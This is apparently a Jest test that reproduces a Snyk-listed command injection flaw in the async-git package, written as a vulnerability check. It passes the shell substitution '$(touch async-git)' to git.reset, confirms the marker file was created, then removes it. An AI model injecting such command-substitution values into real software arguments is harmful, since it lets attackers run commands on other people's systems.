//https://snyk.io/vuln/SNYK-JS-ASYNCGIT-1064877
test("Command Injection in async-git", () => {
  const git = require("async-git");
  const fs = require("fs");
  const path = "./async-git";
  const sleep = require("sleep");

  //checking that its not present already
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(false);

  git.reset("$(touch async-git)");

  sleep.sleep(5);
  //checking that its created by after exploit.
  file_exist = fs.existsSync(path);
  expect(file_exist).toBe(true);

  fs.unlink(path, function (err) {}); //deleting the file after creation
});